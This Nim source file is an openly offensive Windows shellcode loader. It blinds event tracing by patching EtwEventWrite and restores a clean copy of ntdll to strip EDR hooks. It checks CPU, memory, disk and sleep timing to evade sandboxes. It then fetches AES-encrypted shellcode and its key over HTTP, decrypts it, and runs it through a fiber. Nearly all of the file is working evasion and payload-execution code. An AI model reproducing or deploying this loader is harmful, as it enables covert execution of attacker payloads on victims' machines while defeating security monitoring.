import std/[strutils, strformat, times, os, random, httpclient, sequtils, json]
import winim/lean
import winim/inc/psapi
import dynlib
import ptr_math
import nimcrypto

type
  ConvertThreadToFiber_t = proc(lpParameter: LPVOID): LPVOID {.stdcall.}
  CreateFiber_t = proc(dwStackSize: SIZE_T, lpStartAddress: LPFIBER_START_ROUTINE, lpParameter: LPVOID): LPVOID {.stdcall.}
  SwitchToFiber_t = proc(lpFiber: LPVOID): void {.stdcall.}

let hKernel32 = GetModuleHandleA("kernel32.dll")
let addrConvertThreadToFiber = GetProcAddress(hKernel32, "ConvertThreadToFiber")
let addrCreateFiber = GetProcAddress(hKernel32, "CreateFiber")
let addrSwitchToFiber = GetProcAddress(hKernel32, "SwitchToFiber")

echo fmt"[i] ConvertThreadToFiber : 0x{addrConvertThreadToFiber.repr}"
echo fmt"[i] CreateFiber : 0x{addrCreateFiber.repr}"
echo fmt"[i] SwitchToFiber : 0x{addrSwitchToFiber.repr}"

let pConvertThreadToFiber = cast[ConvertThreadToFiber_t](addrConvertThreadToFiber)
let pCreateFiber = cast[CreateFiber_t](addrCreateFiber)
let pSwitchToFiber = cast[SwitchToFiber_t](addrSwitchToFiber)

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc getSC(): seq[byte] =
    var client = newHttpClient()
    var client2 = newHttpClient()
    var enctext =  toByteSeq(client.getContent("http://127.0.0.1:8000/sc_enc.bin"))
    var constants = parseJson(client2.getContent("http://127.0.0.1:8000/constants.json"))
    client.close()
    client2.close()

    echo "[i] Decrypting shellcode"
    
    let IV_t = constants["IV"].getElems().mapIt(it.getInt())
    echo "\t[*] Successfuly got IV : ", IV_t
    var iv: seq[byte]
    for e in IV_t:
        iv.add(byte(e))
    
    
    let KEY_t = constants["KEY"].getElems().mapIt(it.getInt())
    echo "\t[*] Successfuly got KEY : ", KEY_t
    var key: seq[byte]
    for e in KEY_t:
        key.add(byte(e))

    var
      dectext = newSeq[byte](len(enctext))
      dctx: CTR[aes256]

    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()

    return dectext

proc checkSandbox(timeToSleep: int) =

    echo "[i] Sandbox checks."

    var systemInfo: SYSTEM_INFO
    GetSystemInfo(&systemInfo);
    var numberOfProcessors: DWORD = systemInfo.dwNumberOfProcessors
    if (numberOfProcessors < 2):
        echo "[!] Not enough CPUs"
        quit(0)
    echo fmt("\t[*] We have {numberOfProcessors} CPUs")

    var memInfo: MEMORYSTATUSEX
    memInfo.dwLength = DWORD(sizeof(memInfo).int32)
    if GlobalMemoryStatusEx(memInfo.addr):
        if memInfo.ullTotalPhys/1024/1024/1024 < 2:
            echo fmt("[!] Error not enough memory ! {memInfo.ullTotalPhys/1024/1024/1024} GB")
            quit(0)
        echo fmt("\t[*] Available memory : {memInfo.ullTotalPhys/1024/1024/1024} GB")
    else:
        echo "Error"
        quit(0)

    var freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes: ULARGE_INTEGER
    if GetDiskFreeSpaceEx("C:\\".cstring, freeBytesAvailable.addr, totalNumberOfBytes.addr, totalNumberOfFreeBytes.addr):
        if totalNumberOfBytes.QuadPart/1024/1024/1024 < 100:
            echo "[!] Error, not enough disk space"
            quit(0)
    else:
        echo "Error"
    echo fmt("\t[*] Size of C: {totalNumberOfBytes.QuadPart/1024/1024/1024} GB")

    let startTime = cpuTime()
    sleep(timeToSleep)
    let endTime = cpuTime()
    let elapsed = endTime-startTime

    if elapsed < timeToSleep/1000:
        echo "[!] We didn't slept the right amount of time !"
        quit(0)
    echo fmt("\t[*] Sleep time elapsed : {elapsed}")

    echo "\t\t[*] Successfuly passes sandbox checks"

proc patchEtw(): bool = 
    echo "[i] ETW Patching"
    when defined amd64:
        echo "\t[*] Running in a x64 process"
        const patch: array[1, byte] = [byte 0xc3]
    else:
        echo "[!] Architecture not supported!"
        quit(0)

    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[!] Error, failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite")
    if isNil(cs):
        echo "[!] Error, failed to get the address of EtwEventWrite"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "\t[*] Applying Etw patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true
    
    return disabled

proc ntdllUnhook(): bool =

    echo "[i] NTDLL Unhooking."

    let low: uint16 = 0
    var
        hProcess = GetCurrentProcess()
        mi: MODULEINFO
        ntdllModule = GetModuleHandleA("ntdll.dll")
        ntdllBase: LPVOID
        ntdllFile: FileHandle
        ntdllMapping: HANDLE
        ntdllMappingAddress: LPVOID
        hookedDosHeader: PIMAGE_DOS_HEADER
        hookedNtHeader: PIMAGE_NT_HEADERS
        hookedSectionHeader: PIMAGE_SECTION_HEADER

    GetModuleInformation(hProcess, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
    ntdllBase = mi.lpBaseOfDll
    ntdllFile = getOsFileHandle(open("C:\\Windows\\System32\\ntdll.dll", fmRead))
    ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL)
    if ntdllMapping == 0:
        echo fmt"[!] Could not create file mapping object {GetLastError()}."
        return false
    echo "\t[*] Successfuly mapped object"
    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
    if ntdllMappingAddress.isNil:
        echo fmt"[!] Could not map view of file {GetLastError()}."
        return false
    echo "\t[*] Successfuly mapped NTDLL from disk"
    hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
    hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
    for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
        hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if ".text" in toString(hookedSectionHeader.Name):
            var oldProtection: DWORD = 0
            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:
                echo fmt"[!] Failed calling VirtualProtect {GetLastError()}."
                return false
            echo "\t[*] Successfuly changed Memory protections of NTDLL"
            copyMem(ntdllBase  + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
            echo "\t[*] Copied clean version of NTDLL"
            if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
                echo fmt"[!] Failed resetting memory back to it's origin protections {GetLastError()}."
                return false
            echo "\t[*] Resetting origin memory protections"
    CloseHandle(hProcess)
    CloseHandle(ntdllFile)
    CloseHandle(ntdllMapping)
    FreeLibrary(ntdllModule)
    return true

proc run() =

    var sc:seq[byte] = getSC()
    echo "[i] Executing shellcode"

    echo fmt("\t[*] Shellcode gathered. Size: {sc.len}")

    var mainFiber = pConvertThreadToFiber(nil)
    echo fmt("\t[*] Converted Thread to Fiber. {mainFiber.repr}")

    var shellcodeLocation = VirtualAlloc(nil, cast[SIZE_T](sc.len), MEM_COMMIT, PAGE_READWRITE)
    echo fmt("\t[*] Allocated shellcodeLocation => {shellcodeLocation.repr}")

    CopyMemory(shellcodeLocation, unsafeAddr sc[0], sc.len)
    echo fmt("\t[*] Copied {sc.len} bytes to new address space")

    var shellcodeFiber = pCreateFiber(cast[SIZE_T](0), cast[LPFIBER_START_ROUTINE](shellcodeLocation), NULL)
    echo fmt("\t[*] Fiber location => {shellcodeFiber.repr}")

    var oldProtect: ULONG
    if(VirtualProtect(shellcodeLocation, cast[SIZE_T](sc.len), PAGE_EXECUTE_READ, addr oldProtect)):
        echo "\t[*] Changed memory protection to RX"
    else:
        echo fmt"[!] Error: {GetLastError()}"

    echo "\t\t[*] Switching to new fiber !"
    pSwitchToFiber(shellcodeFiber)

when isMainModule:
    let patching:bool = patchEtw()
    if patching:
        echo "\t\t[*] Successfuly patched Etw"
    else:
        quit(0)
    
    let unhook:bool = ntdllUnhook()
    if unhook:
        echo "\t\t[*] Successfuly unhooked NTDLL.dll"
    else:
        quit(0)

    checkSandbox(rand(5000..10000))
    run()